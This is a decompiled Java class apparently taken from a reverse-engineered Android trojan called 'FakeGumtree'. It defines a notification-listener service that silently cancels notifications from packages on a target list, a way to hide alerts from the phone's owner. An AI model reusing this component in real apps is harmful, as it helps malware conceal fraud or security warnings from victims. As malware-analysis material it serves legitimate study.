package com.gumsis.not;

import android.annotation.TargetApi;
import android.content.Intent;
import android.os.Build.VERSION;
import android.os.IBinder;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import com.gumsis.Realtalk;
import com.gumsis.checktls.Print;

@TargetApi(18)
public class NLService
  extends NotificationListenerService
{
  private boolean hasNotPkg(StatusBarNotification paramStatusBarNotification)
    throws Exception
  {
    boolean bool = false;
    paramStatusBarNotification = paramStatusBarNotification.getPackageName();
    if (paramStatusBarNotification != null) {
      bool = Realtalk.hasNotCurPackage(paramStatusBarNotification);
    }
    return bool;
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return super.onBind(paramIntent);
  }
  
  public void onNotificationPosted(StatusBarNotification paramStatusBarNotification)
  {
    try
    {
      if (hasNotPkg(paramStatusBarNotification))
      {
        if (Build.VERSION.SDK_INT < 21)
        {
          cancelNotification(paramStatusBarNotification.getPackageName(), paramStatusBarNotification.getTag(), paramStatusBarNotification.getId());
          return;
        }
        cancelNotification(paramStatusBarNotification.getKey());
        return;
      }
    }
    catch (Exception paramStatusBarNotification)
    {
      Print.e(paramStatusBarNotification.toString());
    }
  }
  
  public void onNotificationRemoved(StatusBarNotification paramStatusBarNotification) {}
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/not/NLService.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */